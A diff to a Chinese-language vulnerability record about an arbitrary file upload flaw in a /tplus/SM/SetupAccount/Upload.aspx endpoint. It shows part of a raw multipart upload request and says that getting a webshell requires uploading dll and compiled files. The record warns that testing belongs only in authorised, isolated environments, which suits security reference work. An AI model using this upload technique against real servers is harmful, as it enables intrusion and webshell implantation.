@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -77,6 +77,7 @@ POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
 Host:
 Accept: */*
 Accept-Encoding: gzip, deflate
+Content-Length: 261
 User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu
 Connection: close
@@ -89,7 +90,7 @@ Content-Type: image/jpeg
 ------WebKitFormBoundaryVXR9biLu--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 261；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 261；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 由于应用为预编译的，直接上传的 `aspx木马`无法直接利用，需要通过上传 `dll 与 compiled `文件后利用Webshell
 
